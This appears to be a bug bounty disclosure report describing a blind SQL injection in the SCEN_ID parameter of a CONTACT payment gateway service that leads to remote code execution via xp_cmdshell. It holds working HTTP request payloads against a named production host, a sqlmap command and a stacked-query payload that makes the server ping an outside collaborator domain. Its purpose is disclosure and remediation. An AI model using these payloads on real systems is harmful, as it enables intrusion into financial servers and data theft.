Because of insufficient input validation, an attacker can abuse the `SCEN_ID` parameter to inject arbitrary SQL statements into the `WHERE` clause of the underlying SQL statement. This leads to a blind SQL injection vulnerability, which in turn leads to Remote Code Execution on the server.\n\n## Technical details\n\nTo find this vulnerability, I made use of a working `INT_SOFT_ID` that I found in online documentation, and the documentation for the `TScenObject` class on https://www.contact-sys.com/files/redactor/files/04_CONTACT%20Gateway_28.11.2017-2.pdf\n\nIt also leverages the fact that requests with the flag `ExpectSigned=\"No\"` set do not require a valid signature.\n\nThe query appears to be something like:\n\n```sql\nSELECT *  FROM tblName WHERE id=\u003cinject\u003e order by STEP;\n```\n\nThe RCE can be triggered by chaining multiple queries as one:\n````sql\n33; DECLARE @command varchar(255); SELECT @command='ping yhjbc2mndl88o89il3ueyud7zy5pte.burpcollaborator.net'; EXEC Master.dbo.xp_cmdshell @command; SELECT 1 as 'STEP'\n``\n\n## Steps to reproduce\n\nTo confirm the SQL injection, run `sqlmap -r sqlitest.txt --batch --current-db --force-ssl` with the following `input.txt`:\n\n```http\nPOST / HTTP/1.1\nHost: contactws.contact-sys.com:3456\nContent-Type: application/xml\nContent-Length: 185\n\n\u003cREQUEST OBJECT_CLASS=\"TScenObject\" ACTION=\"ScenObjects\" SCEN_ID=\"33*\" ExpectSigned=\"No\" INT_SOFT_ID=\"DA61D1CE-757F-44C3-B3F7-11A026C37CD4\" POINT_CODE=\"tzhr\" lang=\"en\"\u003e\u003c/REQUEST\u003e\n```\n\n{F743576}\n\nTo reproduce the RCE, execute the following request (replace with your own burp collaborator):\n\n```http\nPOST / HTTP/1.1\nHost: contactws.contact-sys.com:3456\nContent-Type: application/xml\nContent-Length: 342\n\n\u003cREQUEST OBJECT_CLASS=\"TScenObject\" ACTION=\"ScenObjects\" SCEN_ID=\"33; DECLARE @command varchar(255); SELECT @command='ping yhjbc2mndl88o89il3ueyud7zy5pte.burpcollaborator.net'; EXEC Master.dbo.xp_cmdshell @command; SELECT 1 as 'STEP'\" ExpectSigned=\"No\" INT_SOFT_ID=\"DA61D1CE-757F-44C3-B3F7-11A026C37CD4\" POINT_CODE=\"tzhr\" lang=\"en\"\u003e\u003c/REQUEST\u003e\n```\nand monitor your DNS logs for the incoming ping request:\n\n{F743577}\n\n## Recommendation\n\nSQL injection vulnerabilities can be remedied by escaping the user-supplied input instead of using it to construct a query.\n\n## Impact\n\nBy executing arbitrary commands on the server, an attacker could compromise the integrity, availability and confidentiality of customer's financially sensitive data on the CONTACT server and database, and pivot onto other servers on the internal network.","bounty_amount":"5500.0","formatted_bounty":"$5,500","weakness":{"id":70,"name":"Code
